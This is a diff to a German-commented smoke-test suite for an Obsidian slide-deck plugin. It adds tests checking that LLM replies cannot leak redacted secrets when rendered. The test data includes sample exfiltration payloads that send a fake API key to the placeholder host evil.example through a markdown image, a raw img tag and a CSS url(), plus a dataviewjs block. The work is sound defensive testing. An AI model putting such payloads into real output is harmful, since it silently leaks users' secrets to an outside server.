@@ -62,6 +62,7 @@ import { capture } from "../../tools/obsidian-cdp/shot.js";
 // beim naechsten neuen Namensraum still blind — und genau diese Sorte Blindheit misst B2.
 import { STRINGS_DE, STRINGS_EN } from "../src/i18n";
 import { MODES } from "../src/vendor/kit/sampling-profiles";
+import { renderMarkdown } from "../src/vendor/deck-core/pure/render/md2html";
 // Die Texte des Endpunkt-Abschnitts kommen seit dem Verbindungs-Tausch aus dem Kit, nicht mehr aus i18n.ts.
 import { LLM_CONNECTION_STRINGS_DE, LLM_CONNECTION_STRINGS_EN } from "../src/vendor/kit-obsidian/llm-connection-strings";
 import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
@@ -1132,10 +1133,6 @@ const endpunktQuelle: Section = {
     } finally {
       if (mitManager) await schliesseTab(cdp, mitManager);
       await entferne();
-      // Kit-Befund 0.51.2 (an obsidian-plugins-34 gemeldet): `resolve()` gibt nach dem Wegfall des Managers das
-      // gemerkte Manager-Ergebnis zurueck, bis etwas `invalidate()` ruft. Der Punkt prueft die lokale Liste,
-      // nicht diesen Kit-Fehler — faellt er im Kit, kommt der Aufruf hier wieder heraus.
-      await verbindungNeu(cdp);
     }
 
     const ohne = await oeffneTab(cdp, ctx);
@@ -1668,7 +1665,7 @@ const chatSektion: Section = {
     // Seit dem Verbindungs-Tausch kommt der Endpunkt aus der Aufloesung — ein "falscher Pfad" gaebe
     // schon dort "kein Endpunkt" und erreichte den Fehlerkoerper nie (umgeschrieben, Welle 15).
     const QUELLE_G3 = "# Wandern\n\nEine Tagestour braucht Wasser, feste Schuhe und eine Karte.";
-    const fehler = await startFakeChat(true);
+    const fehler = await startFakeChat({ fehlerKoerper: true });
     try {
       await starte("__sdG3", fehler.url, QUELLE_G3, false, "smoke-chat-g3.md");
       const g3 = await warte("__sdG3", 60_000);
@@ -1713,7 +1710,8 @@ const ANFRAGE_KOPF = `[...wurzel.querySelectorAll(".okit-collapsible-header")].f
 
 /** Fake-Chat-Endpunkt im Node-Prozess; merkt sich jeden POST-Body. Mit CORS-Freigabe, damit der
  *  Stream-Weg (XHR) durchkommt und der Body vom echten Transport stammt. */
-async function startFakeChat(fehlerKoerper = false): Promise<{ url: string; bodies: unknown[]; auth: (string | undefined)[]; close(): Promise<void> }> {
+async function startFakeChat(opts: { fehlerKoerper?: boolean; antwort?: string } = {}): Promise<{ url: string; bodies: unknown[]; auth: (string | undefined)[]; close(): Promise<void> }> {
+  const fehlerKoerper = opts.fehlerKoerper === true;
   const bodies: unknown[] = [];
   const auth: (string | undefined)[] = [];
   const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Methods": "GET, POST, OPTIONS" };
@@ -1731,7 +1729,7 @@ async function startFakeChat(fehlerKoerper = false): Promise<{ url: string; bodi
         // Spiegelt einen Platzhalter der Schwaerzung zurueck, falls die Anfrage einen enthielt (V3).
         const echo = /\[redacted-[a-z]+-\d+\]/.exec(raw)?.[0];
         res.writeHead(200, { ...cors, "Content-Type": "text/event-stream" });
-        res.write(`data: ${JSON.stringify({ model: "google/gemma-4-e4b", choices: [{ delta: { content: echo ? `kein Deck ${echo}` : "kein Deck" } }] })}\n\n`);
+        res.write(`data: ${JSON.stringify({ model: "google/gemma-4-e4b", choices: [{ delta: { content: opts.antwort ?? (echo ? `kein Deck ${echo}` : "kein Deck") } }] })}\n\n`);
         res.write(`data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: "stop" }] })}\n\n`);
         res.end("data: [DONE]\n\n");
       });
@@ -1893,6 +1891,53 @@ const verbindung: Section = {
       record("V3 Schwaerzung: das Token geht als Platzhalter an den Server, im Ergebnis steht das Original",
         r.ok && !wire.includes(TOKEN) && /\[redacted-/.test(wire) && (r.content ?? "").includes(TOKEN) && (r.redactions ?? 0) > 0,
         `Draht ohne Original: ${!wire.includes(TOKEN)} · Platzhalter da: ${/\[redacted-/.test(wire)} · Original im Ergebnis: ${(r.content ?? "").includes(TOKEN)} · redactions=${r.redactions}`);
+      // V4–V8 — die Sicherheitsgrenze der Schwaerzung: die restaurierte Antwort darf beim Rendern nichts von
+      // aussen laden (Original in einer Fern-URL = Geheimnis geht ohne Klick hinaus). Die Antwort kommt von einem
+      // Fake-Server, das Deck wird ueber den echten Erzeugen-Weg in eine Notiz geschrieben, die Notiz gelesen und
+      // gerendert. Gegenprobe je Weg: dieselbe Antwort OHNE Entschaerfung laedt von aussen (Node-seitig gerendert).
+      const SECRET = "sk-abcdef0123456789abcdef";
+      const laedt = (md: string): boolean => {
+        const html = renderMarkdown({ markdown: md, resolveEmbed: () => null }).html;
+        return /<(?:img|iframe|video|audio|source)\b[^>]*\bsrc=["']?https?:/i.test(html) || /url\(\s*["']?https?:/i.test(html);
+      };
+      const generiere = async (antwort: string, ziel: string): Promise<string> => {
+        const f = await startFakeChat({ antwort });
+        try {
+          erzeugtePfade.push(ziel);
+          await cdp.evaluate(`
+            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+            p.settings.llmEndpoints = [{ url: ${JSON.stringify(f.url)} }]; p.settings.llmModel = "google/gemma-4-e4b";
+            p.llm.invalidate();
+            await p.llm.resolve();
+            globalThis.__sdV = { fertig: false };
+            const h = p.startDeckGeneration({ sourceBody: "# Probe\\n\\nEin Satz.", slideTarget: 3, hint: "", themeKey: p.settings.defaultTheme,
+              model: "google/gemma-4-e4b", targetPath: ${JSON.stringify(ziel)}, replace: true, sourceLink: "[[smoke]]" });
+            h.done.then((r) => { globalThis.__sdV = { fertig: true, status: r.status }; });
+            return true;
+          `);
+          await pollUntil<string>(cdp, `const s = globalThis.__sdV; return s && s.fertig ? JSON.stringify(s) : null;`, 60_000, 300);
+          return await cdp.evaluate<string>(`const f = app.vault.getAbstractFileByPath(${JSON.stringify(ziel)}); return f ? await app.vault.read(f) : "";`);
+        } finally { await f.close(); }
+      };
+      const wege: { id: string; name: string; antwort: string }[] = [
+        { id: "V4", name: "Markdown-Bild", antwort: `---\ntheme: kami\n---\n# A\n\n![x](https://evil.example/?d=${SECRET})\n\n---\n\n# B` },
+        { id: "V5", name: "rohes <img>", antwort: `---\ntheme: kami\n---\n# A\n\n<img src="https://evil.example/h?d=${SECRET}">\n\n---\n\n# B` },
+        { id: "V6", name: "url() in style", antwort: `---\ntheme: kami\n---\n# A\n\n<div style="background:url(https://evil.example/b?d=${SECRET})">x</div>\n\n---\n\n# B` },
+      ];
+      for (const w of wege) {
+        const note = await generiere(w.antwort, `smoke-sicher-${w.id.toLowerCase()}.md`);
+        record(`${w.id} Entschaerfung: ${w.name} in der erzeugten Notiz laedt nichts von aussen (Gegenprobe: ohne sie laedt es)`,
+          note !== "" && laedt(w.antwort) && !laedt(note), `Notiz geschrieben: ${note !== ""} · ohne Entschaerfung laedt: ${laedt(w.antwort)} · mit: ${note !== "" ? laedt(note) : "n/a"}`);
+      }
+      const fence = "---\ntheme: kami\n---\n# A\n\n```dataviewjs\ndv.pages()\n```\n\n---\n\n# B";
+      const fenceNote = await generiere(fence, "smoke-sicher-v7.md");
+      record("V7 Entschaerfung: ein dataviewjs-Block steht in der erzeugten Notiz nicht mehr als Prozessor-Fence (Gegenprobe: die Antwort hatte ihn)",
+        fenceNote !== "" && /^```dataviewjs/m.test(fence) && !/^```dataviewjs/m.test(fenceNote), `Notiz geschrieben: ${fenceNote !== ""} · Fence in der Notiz: ${/^```dataviewjs/m.test(fenceNote)}`);
+      const gut = "---\ntheme: kami\n---\n# A\n\n<!-- layout: two-column -->\n\n![[bild.png]]\n\n```mermaid\ngraph TD; A-->B\n```\n\n![lokal](data:image/png;base64,AAAA)\n\n---\n\n# B\n\n[Link](https://example.org)";
+      const gutNote = await generiere(gut, "smoke-sicher-v8.md");
+      const bleibt = ["<!-- layout: two-column -->", "![[bild.png]]", "```mermaid", "![lokal](data:image/png;base64,AAAA)", "[Link](https://example.org)"];
+      record("V8 Entschaerfung laesst ein normales Deck unveraendert: Direktive, Datei-Embed, Mermaid, data:-Bild und Link bleiben",
+        gutNote !== "" && bleibt.every((b) => gutNote.includes(b)), `fehlend: ${JSON.stringify(bleibt.filter((b) => !gutNote.includes(b)))}`);
     } finally {
       await fake.close();
       // Den Klartext-Schluessel nicht im Staging-Vault liegen lassen: Liste leeren, Schluesselbund-Eintraege des Plugins loeschen.
